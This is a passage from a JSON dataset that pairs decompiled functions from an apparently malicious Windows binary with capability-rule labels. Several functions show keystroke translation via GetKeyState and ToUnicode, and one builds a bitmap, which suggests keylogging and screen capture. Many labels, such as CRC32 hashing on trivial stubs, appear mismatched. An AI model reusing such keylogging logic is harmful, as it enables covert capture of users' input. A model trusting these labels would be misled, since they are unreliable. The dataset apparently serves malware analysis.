            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040200b(uint32_t arg_8h)\n\n{\n    fcn.00404ccf();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "0040202a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040202a(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197f4;\n    fcn.00406f1d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00402052": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402052(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197fc;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00402070": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402070(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419804;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040208e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040208e(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41980c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "004020ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020ac(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419814;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "004020ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020ca(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41981c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004020e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020e8(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419824;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00402106": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402106(uint32_t arg_8h)\n\n{\n    fcn.00404e54();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402125": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402125(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419834;\n    in_ECX[1] = 0x41983c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00402152": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402152(uint32_t arg_8h)\n\n{\n    fcn.00404f63();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402179": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402179(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41985c;\n    in_ECX[1] = 0x419854;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004021a6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021a6(uint32_t arg_8h)\n\n{\n    fcn.0040502e();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "004021c5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021c5(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41986c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "004021e3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021e3(uint32_t arg_8h)\n\n{\n    fcn.004050ca();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402202": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402202(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41987c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00402220": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402220(uint32_t arg_8h)\n\n{\n    fcn.0040527a();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040223f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040223f(uint32_t arg_8h)\n\n{\n    fcn.004053ae();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040225e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040225e(uint32_t arg_8h)\n\n{\n    fcn.004054ac();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040227d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040227d(uint32_t arg_8h)\n\n{\n    fcn.00405580();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040229c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040229c(uint32_t arg_8h)\n\n{\n    fcn.0040566f();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "004022bb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022bb(uint32_t arg_8h)\n\n{\n    fcn.0040579a();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004022da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022da(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4198b4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00402313": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402313(uint32_t arg_8h)\n\n{\n    fcn.00405966();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00402332": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402332(uint32_t arg_8h)\n\n{\n    fcn.004059d7();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402351": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402351(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4198cc;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0040236f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040236f(uint32_t arg_8h)\n\n{\n    fcn.00405b26();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00402b5d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b5d(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41c19c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00402d67": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d67(uint32_t arg_8h)\n\n{\n    fcn.00416233();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402ec3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ec3(uint32_t arg_8h)\n\n{\n    fcn.0041705f();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00402ee2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ee2(uint32_t arg_8h)\n\n{\n    fcn.00417105();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402f01": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f01(uint32_t arg_8h)\n\n{\n    fcn.004172da();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00402f20": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f20(uint32_t arg_8h)\n\n{\n    fcn.0041739a();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00402f3f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f3f(uint32_t arg_8h)\n\n{\n    fcn.004174a1();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00402f5e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f5e(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41c99c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00402f7c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f7c(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41c9a4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00402fbc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fbc(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41c9ac;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00402fda": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fda(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41c9b4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040b167": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t fcn.0040b167(void)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetKeyState)(0x14);\n    return uVar1 & 1;\n}\n",
        "token_count": 53
    },
    "0041452d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041452d(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    var_4h = 0;\n    uVar1 = fcn.00414498();\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        uVar2 = fcn.00414422(5, &var_4h);\n        if ((uVar2 == 0) || (iVar4 = var_4h,  var_4h == 0)) {\n            uVar3 = ~*(uVar1 + 0x16) & 1;\n        }\n        else {\n            do {\n                iVar4 = iVar4 - *(uVar2 + 4);\n                uVar2 = fcn.00414278(uVar2 + 8, arg_8h, arg_ch);\n                if (uVar2 == 0) break;\n            } while (iVar4 != 0);\n            uVar3 = 1;\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 290
    },
    "004017a5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017a5(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    piVar1 = in_ECX[2];\n    if (in_ECX[1] <= piVar1) {\n        piVar4 = (piVar1 + 1U) * in_ECX[3];\n        piVar1 = fcn.00406fa7();\n        piVar3 = NULL;\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            *piVar1 = piVar4;\n            var_8h = piVar1 + 1;\n            for (piVar2 = piVar4; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                piVar1[2] = 0;\n                piVar1[3] = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        piVar1 = in_ECX[2];\n        if (piVar1 != NULL) {\n            piVar2 = var_8h + 2;\n            do {\n                piVar1 = piVar2 + (-8 - var_8h) + *in_ECX;\n                piVar2[-2] = *piVar1;\n                fcn.004043c7(piVar1 + 1);\n                fcn.004043c7(piVar1 + 2);\n                piVar1 = in_ECX[2];\n                piVar3 = piVar3 + 1;\n                piVar2 = piVar2 + 3;\n            } while (piVar3 < piVar1);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401cdf(*in_ECX);\n            piVar1 = in_ECX[2];\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar4;\n    }\n    (*in_ECX)[piVar1 * 3] = arg_8h;\n    fcn.004043c7(&arg_ch);\n    fcn.004043c7(&arg_10h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.004015fb();\n    return;\n}\n",
        "token_count": 572
    },
    "00402612": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402612(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **in_ECX;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t in_stack_00000008;\n    int32_t in_stack_0000000c;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    piVar2 = in_ECX[2];\n    if (in_ECX[1] <= piVar2) {\n        piVar5 = (piVar2 + 1U) * in_ECX[3];\n        piVar2 = fcn.00406fa7();\n        piVar4 = NULL;\n        if (piVar2 == NULL) {\n            var_4h = NULL;\n        }\n        else {\n            var_4h = piVar2 + 1;\n            *piVar2 = piVar5;\n        }\n        piVar2 = in_ECX[2];\n        if (piVar2 != NULL) {\n            iVar3 = 0;\n            do {\n                puVar1 = iVar3 + var_4h;\n                puVar6 = *in_ECX + iVar3;\n                iVar3 = iVar3 + 0xc;\n                piVar4 = piVar4 + 1;\n                *puVar1 = *puVar6;\n                puVar1[1] = puVar6[1];\n                puVar1[2] = puVar6[2];\n                piVar2 = in_ECX[2];\n            } while (piVar4 < piVar2);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00406f8d();\n            piVar2 = in_ECX[2];\n        }\n        *in_ECX = var_4h;\n        in_ECX[1] = piVar5;\n    }\n    piVar2 = *in_ECX + piVar2 * 3;\n    *piVar2 = arg_8h;\n    piVar2[1] = in_stack_00000008;\n    piVar2[2] = in_stack_0000000c;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 520
    },
    "0041614d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041614d(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t iVar1;\n    ushort uStack64;\n    int32_t iStack62;\n    uint uStack58;\n    uint uStack54;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    int32_t iStack28;\n    \n    uStack48 = 0x28;\n    uStack36 = 1;\n    uStack34 = 0x18;\n    uStack32 = 0;\n    iStack28 = arg_28h * arg_24h * 3;\n    iStack44 = arg_24h;\n    iStack40 = arg_28h;\n    uStack54 = 0x36;\n    uStack64 = 0x4d42;\n    arg_28h = ((arg_24h + 1) * 3 & 0xfffffffcU) * arg_28h;\n    iStack62 = arg_28h + 0x36;\n    uStack58 = 0;\n    fcn.00403fc7(&uStack64, 0xe);\n    iVar1 = 0x28;\n    fcn.00403fc7(&uStack58 + 2, 0x28);\n    fcn.00403fc7(arg_8h, arg_28h);\n    fcn.00405f32(&stack0xffffffa8);\n    if (iVar1 != 0) {\n        fcn.00406f66();\n    }\n    fcn.0041700f();\n    return;\n}\n",
        "token_count": 418
    },
    "00405bc2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bc2(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    \n    if (arg_ch != NULL) {\n        if (arg_8h < 0x23) {\n            if (arg_8h == 0x22) {\n                fcn.004036ea(arg_ch);\n            }\n            else if (arg_8h < 0x11) {\n                if (arg_8h == 0x10) {\n                    fcn.00403a14();\n                }\n                else if (arg_8h < 9) {\n                    if (arg_8h == 8) {\n                        fcn.00403c13();\n                    }\n                    else if (arg_8h == 0) {\n                        fcn.00403d11();\n                    }\n                    else if (arg_8h == 2) {\n                        fcn.00403cc8();\n                    }\n                    else if (arg_8h == 4) {\n                        fcn.00403c7f();\n                    }\n                    else if (arg_8h == 6) {\n                        fcn.00403c2a();\n                    }\n                }\n                else if (arg_8h == 10) {\n                    fcn.00403b17();\n                }\n                else if (arg_8h == 0xc) {\n                    fcn.00403ac2();\n                }\n                else if (arg_8h == 0xe) {\n                    fcn.00403a31();\n                }\n            }\n            else if (arg_8h < 0x1b) {\n                if (arg_8h == 0x1a) {\n                    fcn.00403978();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (arg_8h == 0x12) {\n                    fcn.004039ca();\n                }\n                else if (arg_8h == 0x14) {\n                    fcn.004163f3(in_ECX, arg_ch[1]);\n                }\n                else if (arg_8h == 0x16) {\n                    fcn.004163bc();\n                }\n                else if (arg_8h == 0x18) {\n                    fcn.004039a2();\n                }\n            }\n            else if (arg_8h == 0x1c) {\n                fcn.004037e6();\n            }\n            else if (arg_8h == 0x1e) {\n                fcn.004179b8(arg_ch);\n            }\n            else if (arg_8h == 0x20) {\n                fcn.00410249(in_ECX);\n            }\n        }\n        else if (arg_8h < 0x49) {\n            if (arg_8h == 0x48) {\n                fcn.004034d1();\n            }\n            else if (arg_8h < 0x31) {\n                if (arg_8h == 0x30) {\n                    fcn.004035cc(arg_ch);\n                }\n                else if (arg_8h == 0x24) {\n                    fcn.0040bd63(in_ECX, 0);\n                }\n                else if (arg_8h == 0x26) {\n                    fcn.0040bd1d();\n                }\n                else if (arg_8h == 0x28) {\n                    fcn.004120e9(in_ECX, *(in_ECX + 0x23c));\n                }\n                else if (arg_8h == 0x2a) {\n                    fcn.0040366b(arg_ch);\n                }\n                else if (arg_8h == 0x2c) {\n                    fcn.00410c8a();\n                }\n            }\n            else if (arg_8h != 0x32) {\n                if (arg_8h == 0x35) {\n                    fcn.0040397f();\n                }\n                else if (arg_8h == 0x38) {\n                    fcn.0040358c(arg_ch);\n                }\n                else if (arg_8h == 0x3a) {\n                    fcn.00403556();\n                }\n                else if (arg_8h == 0x3c) {\n                    fcn.0040353f();\n                }\n            }\n        }\n        else if (arg_8h == 0x4a) {\n            fcn.00403bb2();\n        }\n        else if (arg_8h == 0x4c) {\n            fcn.0040314b();\n        }\n        else if (arg_8h == 0x4e) {\n            fcn.00411f55();\n        }\n        else if (arg_8h == 0x52) {\n            fcn.00410210(in_ECX);\n        }\n        (***arg_ch)(1);\n    }\n    return;\n}\n",
        "token_count": 1086
    },
    "004069f6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004069f6(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uchar *arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint *arg_8h_01;\n    uint var_ch;\n    \n    fcn.00403e83(&var_ch, **(in_ECX + 0x50) + 4, (*(in_ECX + 0x54) - **(in_ECX + 0x50)) + -4);\n    arg_8h_01 = &var_ch;\n    fcn.00404094(arg_8h_01);\n    arg_8h_00 = &stack0xffffffc8;\n    arg_ch = extraout_ECX;\n    arg_10h = extraout_ECX;\n    fcn.004069a9(&stack0xffffffc8);\n    fcn.0040709b(arg_8h_00, arg_ch, arg_10h, arg_8h_01);\n    fcn.00404081();\n    return arg_8h;\n}\n",
        "token_count": 246
    },
    "004074b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004074b0(int32_t param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    \n    iVar1 = *(param_1 + 4);\n    if (*(param_2 + 4) < iVar1) {\n        uVar3 = 1;\n    }\n    else if (iVar1 < *(param_2 + 4)) {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar3 = 0;\n        iVar4 = iVar1 + -1;\n        puVar5 = *(param_1 + 0xc) + iVar4 * 4;\n        do {\n            uVar2 = *((*(param_2 + 0xc) - *(param_1 + 0xc)) + puVar5);\n            if (*puVar5 >= uVar2 && *puVar5 != uVar2) {\n                return 1;\n            }\n            if (*puVar5 < uVar2) {\n                return 0xffffffff;\n            }\n            puVar5 = puVar5 + -1;\n            iVar4 = iVar4 + -1;\n        } while (-1 < iVar4);\n    }\n    return uVar3;\n}\n",
        "token_count": 291
    },
    "0040b778": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpKeyState\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.0040b778(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint pwszBuff;\n    uint lpKeyState;\n    \n    fcn.00401293(&pwszBuff, 0, 0x100);\n    uVar3 = param_1;\n    uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar3, 0);\n    if (uVar3 < 100) {\n        if (uVar3 != 99) {\n            if (uVar3 < 0x25) {\n                if (uVar3 != 0x24) {\n                    if (uVar3 < 0x13) {\n                        if (((uVar3 != 0x12) && (uVar3 != 8)) && (uVar3 != 9)) {\n                            iVar2 = uVar3 - 0xd;\n                            goto code_r0x0040b7d2;\n                        }\n                    }\n                    else if (uVar3 != 0x14) {\n                        iVar2 = uVar3 - 0x20;\n                        bVar4 = iVar2 == 0;\n                        goto code_r0x0040b8b0;\n                    }\n                }\n            }\n            else if (uVar3 < 0x5c) {\n                if ((((uVar3 != 0x5b) && (uVar3 != 0x25)) && (uVar3 != 0x26)) && ((uVar3 != 0x27 && (uVar3 != 0x28)))) {\n                    bVar4 = uVar3 == 0x2e;\ncode_r0x0040b7dc:\n                    if (!bVar4) goto code_r0x0040b7e4;\n                }\n            }\n            else if (uVar3 != 0x5c) {\n                iVar2 = uVar3 - 0x60;\n                goto code_r0x0040b8b9;\n            }\n        }\n    }\n    else if (uVar3 < 0xbb) {\n        if (uVar3 != 0xba) {\n            if (uVar3 < 0x6a) {\n                if (uVar3 != 0x69) {\n                    iVar2 = uVar3 - 100;\n                    goto code_r0x0040b868;\n                }\n            }\n            else if ((uVar3 != 0xad) && (uVar3 != 0xae)) {\n                iVar2 = uVar3 - 0xaf;\ncode_r0x0040b7d2:\n                if (iVar2 != 0) {\n                    iVar2 = iVar2 + -3;\n                    goto code_r0x0040b7d7;\n                }\n            }\n        }\n    }\n    else if (uVar3 < 0xc1) {\n        if (uVar3 != 0xc0) {\n            iVar2 = uVar3 - 0xbb;\ncode_r0x0040b868:\n            if (iVar2 != 0) {\n                iVar2 = iVar2 + -1;\n                bVar4 = iVar2 == 0;\n                goto code_r0x0040b8b0;\n            }\n        }\n    }\n    else {\n        iVar2 = uVar3 - 0xdb;\n        bVar4 = iVar2 == 0;\ncode_r0x0040b8b0:\n        if (!bVar4) {\n            iVar2 = iVar2 + -1;\ncode_r0x0040b8b9:\n            if (iVar2 != 0) {\n                iVar2 = iVar2 + -1;\ncode_r0x0040b7d7:\n                if (iVar2 != 0) {\n                    bVar4 = iVar2 == 1;\n                    goto code_r0x0040b7dc;\n                }\n            }\n        }\n    }\n    uVar1 = uVar1 | 0x100;\ncode_r0x0040b7e4:\n    lpKeyState._0_1_ = (*_sym.imp.USER32.dll_GetKeyState)(uVar3);\n    (*_sym.imp.USER32.dll_ToUnicode)(uVar3, uVar1, &lpKeyState, &pwszBuff, 1, 0);\n    return &pwszBuff;\n}\n",
        "token_count": 983
    },
    "0040b8c7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
